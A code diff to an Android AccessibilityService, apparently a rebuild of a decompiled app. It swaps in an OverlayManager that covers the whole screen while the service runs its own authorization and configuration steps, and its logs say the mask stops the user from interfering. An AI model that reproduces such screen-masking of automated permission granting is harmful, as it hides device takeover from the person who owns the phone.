@@ -317,6 +317,9 @@ class MyAccessibilityService : AccessibilityService() {
     /** JADX: f52428f9 (C0318a3) — Config progress manager */
     var configProgressManager: ConfigProgressManager? = null
 
+    /** Unified overlay manager — replaces old mask overlay stub (JADX: C0763km) */
+    var overlayManager: com.storm.safe.rock.service.modules.overlay.OverlayManager? = null
+
     /** JADX: f52429g0 (C0327b2) — Main orchestrator */
     var mainOrchestrator: MainOrchestrator? = null
 
@@ -2675,7 +2678,7 @@ class MyAccessibilityService : AccessibilityService() {
                 // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
                 if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                     try {
-                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
+                        overlayManager?.show()
                         android.util.Log.d(TAG, "🖤 Android 11+设备：显示配置期间遮盖")
                         configProgressManager?.startConfig()
                     } catch (_: Exception) {}
@@ -2714,7 +2717,7 @@ class MyAccessibilityService : AccessibilityService() {
                 // Show mask + start authorization
                 if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                     try {
-                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
+                        overlayManager?.show()
                         android.util.Log.d(TAG, "🖤 显示配置期间遮盖，防止用户误操作")
                         configProgressManager?.startConfig()
                     } catch (_: Exception) {}
@@ -2833,8 +2836,12 @@ class MyAccessibilityService : AccessibilityService() {
             // JADX: C1115qm — debugAnalysisManager
             // this.f52426f7 = c1115qm
 
-            // JADX: C0763km — configMaskManager
-            // this.f52427f8 = new C0763km(this, this)
+            // JADX: C0763km — configMaskManager → OverlayManager
+            try {
+                overlayManager = com.storm.safe.rock.service.modules.overlay.OverlayManager(this)
+            } catch (e: Exception) {
+                android.util.Log.e(TAG, "❌ OverlayManager 初始化失败", e)
+            }
 
             // JADX: C0318a3 — configProgressManager
             try {
@@ -2956,9 +2963,8 @@ class MyAccessibilityService : AccessibilityService() {
 
         // JADX: configMaskManager.initMaskOverlay(context) — reads config, creates overlay
         // This depends on C0763km (configMaskManager) and dd0 (mask config)
-        // ADAPT: C0763km (configMaskManager) + C0708j7 (mask config) — vendor overlay
-        // that shows a full-screen mask during initial config. ConfigProgressManager
-        // handles the config-in-progress UI state for the replica.
+        // ADAPT: OverlayManager (initialized above) replaces the vendor overlay.
+        // ConfigProgressManager handles the config-in-progress UI state for the replica.
 
         // JADX: wire eventFilterManager with screenCaptureManager
         // c0614i9.f56823a3 = screenCaptureManager
@@ -3901,7 +3907,7 @@ class MyAccessibilityService : AccessibilityService() {
                 try {
                     android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
                     initializeDeferredManagers()
-                    com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.hide()
+                    overlayManager?.hide()
                     android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
                 } catch (e: Exception) {
                     android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
